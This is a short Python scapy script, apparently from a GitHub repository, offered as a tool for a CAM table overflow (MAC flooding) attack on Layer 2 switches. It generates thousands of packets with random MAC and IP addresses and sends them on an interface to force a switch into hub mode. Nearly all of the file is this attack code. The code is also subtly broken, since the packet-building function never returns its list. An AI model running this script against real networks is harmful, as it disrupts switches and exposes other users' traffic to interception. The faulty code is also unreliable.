
#-------------------------------------------------------------------------------#
#     A script to perform CAM overflow attack on Layer 2 switches               #
#                   Bharath(github.com/yamakira)                                #
#                                                                               #
#     CAM Table Overflow is all about flooding switches CAM table               #
#     with a lot of fake MAC addresses to drive the switch into HUB mode.       #
#-------------------------------------------------------------------------------#

#!/usr/bin/env python
from scapy.all import Ether, IP, TCP, RandIP, RandMAC, sendp


#destMAC = "FF:FF:FF:FF:FF:FF"

'''Filling packet_list with ten thousand random Ethernet packets
   CAM overflow attacks need to be super fast.
   For that reason it's better to create a packet list before hand.
'''
def generate_packets():
    packet_list = []		#initializing packet_list to hold all the packets
    for i in xrange(1,10000):
        packet  = Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
        packet_list.append(packet)

def cam_overflow(packet_list):
# sendpfast(packet,iface='tap0', mbps)
    sendp(packet_list, iface='tap0')


if __name__ == '__main__':
    packet_list = generate_packets()
    cam_overflow(packet_list)

